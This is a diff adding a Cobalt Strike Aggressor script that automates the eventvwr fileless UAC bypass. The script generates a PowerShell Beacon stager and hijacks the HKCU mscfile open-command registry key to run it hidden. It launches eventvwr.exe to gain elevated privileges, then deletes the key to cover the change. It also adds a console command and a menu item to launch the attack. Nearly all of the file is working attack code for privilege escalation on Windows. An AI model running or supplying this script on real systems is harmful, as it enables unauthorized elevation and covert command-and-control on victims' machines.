@@ -1,0 +1,73 @@
+#######################################
+# Fileless UAC Bypass CNA Script
+#
+# Credits:
+# Technique - Matt Nelson @enigma0x3
+# CNA Script - Vincent Yiu @vysecurity
+#######################################
+
+sub eventvwr {
+	local('$script $oneliner');
+
+	# acknowledge this command
+	btask($1, "Tasked Beacon to BypassUAC to " . listener_describe($2) . " via Eventvwr Fileless UAC Bypass");
+
+	# generate a PowerShell script to run our Beacon listener
+	$script = artifact($2, "powershell");
+
+	# host this script within this Beacon
+	$oneliner = beacon_host_script($1, $script);
+
+	# task Beacon to run this exploit with our one-liner that runs Beacon
+	println($oneliner);
+
+	# Hijack registry path
+	btask($1, "Adding Registry Key");
+	$command = "reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /f /d \"" . "cmd.exe /c powershell -nop -w hidden -c \\\"" . $oneliner . "\\\\""";
+	btask($1, $command);
+	bshell($1, $command);
+
+	# Spawn eventvwr.exe
+	btask($1, "Spawning Eventvwr.exe");
+	bshell($1, "eventvwr.exe");
+
+	# complete the staging process
+	bstage($1, $null, $2);
+
+	# Delete key
+	btask($1, "Deleting Registry Key");
+	$command = "reg delete \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /f";
+	btask($1, $command);
+	bshell($1, $command);
+	
+
+}
+
+beacon_command_register("bypassuac-eventvwr", "Bypass UAC using Eventvwr Fileless UAC bypass via. Powershell SMB Beacon",
+	"Synopsis: bypassuac-eventvwr [listener]\n\n" .
+	"Generates a fileless UAC bypass using Powershell one liner");
+
+alias bypassuac-eventvwr {
+	if ($2 is $null) {
+		openPayloadHelper(lambda({
+			eventvwr($bid, $1);
+		}, $bid => $1));
+	}
+	else if (listener_info($2) is $null) {
+		berror($1, "Could not find listener $2");
+	}
+	else {
+		eventvwr($1, $2);
+	}
+}
+
+# create a popup menu to launch this attack too!
+popup beacon_bottom {
+	item "&BypassUAC - eventvwr" {
+		openPayloadHelper(lambda({
+			openOrActivate($bids);
+			binput($bids, "bypassuac-eventvwr \" $+ $1 $+ \"");
+			eventvwr($bids, $1);
+		}, $bids => $1));
+	}
+}
